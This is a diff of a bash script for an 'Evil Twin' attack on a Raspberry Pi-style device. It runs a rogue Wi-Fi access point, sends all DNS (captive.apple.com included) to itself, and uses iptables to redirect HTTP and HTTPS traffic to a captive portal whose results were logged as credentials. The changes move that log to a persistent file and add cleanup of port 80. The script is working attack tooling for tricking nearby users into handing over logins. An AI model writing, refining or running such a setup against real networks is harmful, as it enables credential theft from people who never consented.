@@ -14,21 +14,27 @@ CHANNEL="${3:-6}"
 IFACE="wlan0"
 AP_IP="192.168.66.1"
 DHCP_RANGE="192.168.66.10,192.168.66.50,255.255.255.0,1h"
-LOG_FILE="/tmp/evil_twin_creds.log"
+
+# Persistent log in files folder
+LOG_FILE="/home/mark/pi-gadget/menu_fs/04_files/evil_twin_log.jsonl"
+
 HOSTAPD_CONF="/tmp/evil_twin_hostapd.conf"
 DNSMASQ_CONF="/tmp/evil_twin_dnsmasq.conf"
-PORTAL_PID="/tmp/evil_twin_portal.pid"
 HOSTAPD_PID="/tmp/evil_twin_hostapd.pid"
 DNSMASQ_PID="/tmp/evil_twin_dnsmasq.pid"
 
+_kill_port80() {
+    pkill -f "portal_server.py" 2>/dev/null || true
+    lsof -ti:80 | xargs kill -9 2>/dev/null || true
+}
+
 _stop() {
     echo "[Evil Twin] Stopping..."
-    [ -f "$PORTAL_PID" ]   && kill "$(cat $PORTAL_PID)"   2>/dev/null; rm -f "$PORTAL_PID"
+    _kill_port80
     [ -f "$HOSTAPD_PID" ]  && kill "$(cat $HOSTAPD_PID)"  2>/dev/null; rm -f "$HOSTAPD_PID"
     [ -f "$DNSMASQ_PID" ]  && kill "$(cat $DNSMASQ_PID)"  2>/dev/null; rm -f "$DNSMASQ_PID"
     pkill -f "hostapd $HOSTAPD_CONF" 2>/dev/null || true
-    sudo pkill -f "portal_server.py" 2>/dev/null || true
-    sudo lsof -ti:80 | xargs sudo kill -9 2>/dev/null || true
+    sleep 1
     iptables -t nat -F 2>/dev/null || true
     iptables -F FORWARD 2>/dev/null || true
     ip link set "$IFACE" down 2>/dev/null || true
@@ -49,6 +55,10 @@ _status() {
 
 _start() {
     echo "[Evil Twin] Starting AP: '$SSID' ch$CHANNEL..."
+
+    # Kill anything on port 80 first
+    _kill_port80
+    sleep 0.5
 
     # Disconnect from current network
     nmcli device set "$IFACE" managed no 2>/dev/null || true
@@ -71,20 +81,32 @@ _start() {
         exit 1
     fi
 
-    # dnsmasq config — redirect ALL dns to us
-    printf "interface=%s\nbind-interfaces\ndhcp-range=%s\naddress=/#/%s\ndhcp-option=3,%s\ndhcp-option=6,%s\nno-resolv\n" \
-        "$IFACE" "$DHCP_RANGE" "$AP_IP" "$AP_IP" "$AP_IP" > "$DNSMASQ_CONF"
+    # dnsmasq — redirect ALL dns including captive.apple.com to us
+    cat > "$DNSMASQ_CONF" << DEOF
+interface=$IFACE
+bind-interfaces
+dhcp-range=$DHCP_RANGE
+# Redirect all DNS queries (including captive.apple.com) to our IP
+address=/#/$AP_IP
+dhcp-option=3,$AP_IP
+dhcp-option=6,$AP_IP
+no-resolv
+log-queries=extra
+DEOF
 
     dnsmasq --conf-file="$DNSMASQ_CONF" --pid-file="$DNSMASQ_PID"
     sleep 0.5
 
-    # Redirect all HTTP/HTTPS to captive portal
+    # Redirect HTTP and HTTPS to captive portal
     iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80  -j DNAT --to-destination "$AP_IP:80"
     iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j DNAT --to-destination "$AP_IP:80"
     echo 1 > /proc/sys/net/ipv4/ip_forward
 
+    # Ensure log dir exists
+    mkdir -p "$(dirname $LOG_FILE)"
+
     echo "[Evil Twin] Running. SSID='$SSID' IP=$AP_IP"
-    echo "[Evil Twin] Creds log: $LOG_FILE"
+    echo "[Evil Twin] Log: $LOG_FILE"
 }
 
 case "$MODE" in
